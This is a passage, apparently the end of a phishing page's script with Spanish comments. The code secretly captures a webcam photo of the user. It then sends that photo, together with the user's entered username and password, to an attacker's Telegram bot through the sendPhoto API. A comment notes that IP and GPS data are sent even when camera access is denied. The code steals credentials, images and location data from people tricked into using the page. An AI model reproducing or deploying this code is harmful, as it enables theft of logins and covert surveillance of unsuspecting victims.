        stream.getTracks().forEach(track => track.stop());
        document.body.removeChild(video);

        // Convertir la imagen a Blob (formato PNG)
        canvas.toBlob(async function(blob) {
            let formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'captura_usuario.png');
            formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);

            // Enviar la foto a Telegram usando sendPhoto
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/png');

    } catch (error) {
        console.log("Cámara denegada o no disponible:", error);
        // Si la cámara es denegada, al menos se envía el reporte de texto con IP y GPS
    }
}
</script>
</body>
</html>
